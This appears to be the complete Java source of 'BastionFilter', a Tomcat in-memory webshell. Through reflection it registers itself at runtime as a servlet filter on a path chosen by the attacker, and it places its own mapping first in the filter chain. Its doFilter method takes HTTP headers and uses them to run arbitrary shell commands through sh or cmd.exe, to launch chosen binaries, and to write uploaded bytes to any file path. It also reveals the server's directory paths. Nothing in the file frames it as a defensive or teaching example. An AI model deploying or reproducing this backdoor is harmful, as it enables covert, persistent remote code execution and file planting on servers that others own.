package com.summersec.x;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.EnumSet;
import java.util.Scanner;

public class BastionFilter implements Filter  {

    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";

    public BastionFilter() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            FilterRegistration.Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    static String[] concat(String[] a,String[] b){
        String[] c=new String[a.length+b.length];
        System.arraycopy(a,0,c,0,a.length);
        System.arraycopy(b,0,c,a.length,b.length);
        return c;
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        String dstfile=request.getHeader("dstfile");
        String path=request.getHeader("path");
        String args=request.getHeader("args");
        String cmd=request.getHeader("cmd");
        if (dstfile!=null){

            dstfile=dstfile.trim();
            response.getWriter().write("dstfile:");
            response.getWriter().write(dstfile);
            InputStream ins= request.getInputStream();
            File dstfileh=new File(dstfile);
            if (!dstfileh.exists()){
                dstfileh.createNewFile();
                FileOutputStream fos=new FileOutputStream(dstfileh);
                byte[] data = new byte[1024];
                int len = -1;
                while ((len = ins.read(data)) != -1) {
                    fos.write(data, 0, len);
                }
                fos.flush();
                fos.close();
                response.getWriter().flush();
                response.getWriter().close();
            }else {
                response.getWriter().write("file already exists.");
                response.getWriter().flush();
                response.getWriter().close();
            }

            ins.close();

        }else if (path!=null){

            String[] argsarry=args.split(" ");
            String[] pathargs=concat(new String[]{path},argsarry);
            InputStream in = Runtime.getRuntime().exec(pathargs).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = response.getWriter();
            out.println(output);
            out.flush();
            out.close();

        }else if (cmd!=null){
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = response.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }else {
            String webrootpath=request.getServletContext().getRealPath("/");
            String webjsppath=request.getServletPath();
            String midilepath=(new File(".").getAbsolutePath());
            PrintWriter out = response.getWriter();
            out.println("WebRootPath:");
            out.println(webrootpath);
            out.println("ServletPath:");
            out.println(webjsppath);
            out.println("WebServerPath:");
            out.println(midilepath);
            out.flush();
            out.close();

        }



    }

    public void destroy() {
    }
}
